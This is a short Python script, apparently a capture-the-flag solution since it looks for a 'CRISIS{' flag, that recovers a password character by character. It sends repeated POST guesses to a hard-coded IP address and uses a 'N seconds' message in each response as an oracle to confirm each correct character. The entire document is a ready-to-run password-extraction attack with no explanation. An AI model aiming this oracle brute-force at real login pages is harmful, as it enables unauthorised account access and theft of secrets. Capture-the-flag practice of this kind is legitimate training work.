import requests, string
from requests.structures import CaseInsensitiveDict

url = "http://18.132.195.71/"

headers = CaseInsensitiveDict()

headers["Connection"] = "keep-alive"
headers["Cache-Control"] = "max-age=0"
headers["Upgrade-Insecure-Requests"] = "1"
headers["Origin"] = "http://18.132.195.71"
headers["Content-Type"] = "application/x-www-form-urlencoded"
headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
headers["Referer"] = "http://18.132.195.71/"
headers["Accept-Language"] = "en-US,en;q=0.9,ar;q=0.8,fr;q=0.7"

t = 1
flag = ""

while(True):    
    for s in string.printable:
        tit = flag + s
        data = F"password={tit}"
        resp = requests.post(url, headers=headers, data=data)
        page = resp.content.decode("utf-8")
        if page.find(F"{t} seconds") != -1:
            flag += s
            print(flag)
            t = t+1
            break
        elif s == string.printable[-1]:
            print("Not found")
            exit()
        elif page.find("CRISIS{") != -1:
            flag += s
            print(F"the password is {flag}")
            print(page)
            exit()

